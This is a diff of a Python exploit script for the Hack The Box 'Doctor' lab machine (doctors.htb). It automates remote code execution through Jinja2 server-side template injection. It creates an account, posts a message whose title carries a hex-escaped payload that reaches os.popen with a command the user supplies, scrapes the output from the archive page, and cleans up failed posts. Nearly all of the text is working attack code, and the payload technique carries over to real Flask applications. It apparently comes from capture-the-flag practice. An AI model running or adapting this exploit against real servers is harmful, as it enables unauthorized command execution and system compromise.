@@ -1,6 +1,10 @@
-import requests, re, argparse, random
+#!/usr/bin/python3
 
-# Parsing the commmand from the user
+import requests, argparse
+from re import findall
+from random import randint
+
+# Parsing the commmand from the user.
 parser = argparse.ArgumentParser(description = 'Hack the Box Doctor RCE')
 parser.add_argument('-c', '--command', metavar = '<COMMAND>', type = str, required = True, help = "Command you want to be executed. eg. python rce.py -c 'whoami'")
 parser.add_argument('-v', '--verbose', help = 'Increase output verbosity', action = 'store_true')
@@ -35,10 +39,10 @@ def get_cookie(): # Gets the cookie so we can post our message
         print("[\033[92m+\033[0m] Cookie retrieved")
     return cookie
 
-def send_payload(cookie, command): # Sends the command payload as the message title
+def send_payload(cookie, command): # Sends the command payload as the message title.
     if args.verbose:
         print("[\033[94m*\033[0m] Sending payload")
-    message_id = "a" + str(random.randint(0, 10000)) # I created a message id in case the command gives an error, the only way to fix the error and allow you to enter more commands is to delete the message. The message id was my method of finding the message with the invalid command and deleting it.
+    message_id = "a" + str(randint(0, 10000)) # I created a message ID in case the command gives an error, the only way to fix the error and allow you to enter more commands is to delete the message. The message ID was my method of finding the message with the invalid command and deleting it.
     url = 'http://doctors.htb/post/new'
     payload = "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('" + command + "')|attr('read')()}}"
     data = {'title' : payload, 'content' : message_id, 'submit' : 'Post'}
@@ -51,7 +55,7 @@ def send_payload(cookie, command): # Sends the command payload as the message ti
         print("[\033[92m+\033[0m] Payload sent")
     return message_id
     
-def read_output(cookie, message_id): # Reads the output from the most recent command
+def read_output(cookie, message_id): # Reads the output from the most recent command.
     if args.verbose:
         print("[\033[94m*\033[0m] Getting output from /archives")
     url = "http://doctors.htb/archive"
@@ -65,13 +69,13 @@ def read_output(cookie, message_id): # Reads the output from the most recent com
         delete_message(cookie, message_id)
         exit()
     html = response.text
-    outputs = re.findall(r'<title>\s*([\s\S]+?)\s*</title>', html) # Finds all outputs in the page source
-    output = outputs[-1] # Shows the most recent output (relevant to the most recent command)
+    outputs = findall(r'<title>\s*([\s\S]+?)\s*</title>', html) # Finds all outputs in the page source.
+    output = outputs[-1] # Shows the most recent output (relevant to the most recent command).
     if args.verbose:
         print("[\033[92m+\033[0m] Output retrieved\n")
     return output
 
-def delete_message(cookie, message_id):
+def delete_message(cookie, message_id):  # Finds the message to be deleted so the internal error goes away on the archives page.
     if args.verbose:
         print("[\033[36m*\033[0m] Deleting most recent message")
     counter = 0
@@ -85,7 +89,7 @@ def delete_message(cookie, message_id):
             exit()
         if response.status_code != 404:
             html = response.text
-            message = re.findall(r'<p class="article-content">\s*([\s\S]+?)\s*</p>', html)
+            message = findall(r'<p class="article-content">\s*([\s\S]+?)\s*</p>', html)
             if str(message[0]) == message_id:
                 url += '/delete'
                 try:
@@ -97,8 +101,7 @@ def delete_message(cookie, message_id):
         counter += 1    
     print("[\033[92m+\033[0m] Message deleted, re-run again with valid command")
 
-    
-############## Main ################
+
 make_account()
 cookie = get_cookie()
 command = args.command
